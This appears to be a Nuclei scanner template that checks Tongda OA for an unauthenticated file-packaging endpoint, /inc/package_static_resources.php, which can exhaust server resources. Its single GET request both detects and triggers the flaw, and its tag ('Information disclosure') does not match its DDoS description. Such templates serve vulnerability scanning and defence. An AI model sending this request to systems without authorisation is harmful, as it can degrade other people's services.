content:
id: tongda-oa-package_static_resources-ddos

info:
  name: 通达OA package_static_resources存在DDos漏洞
  author: xiaoyu
  severity: medium
  description: 该漏洞也属于未授权访问，不过功能是打包文件，消耗系统大量资源。
  tags: Information disclosure

http:
  - raw:
      - |
        GET /inc/package_static_resources.php HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '打包成功'
        condition: and
      - type: status
        status: 
          - 200
author: 拎着自己飞呀
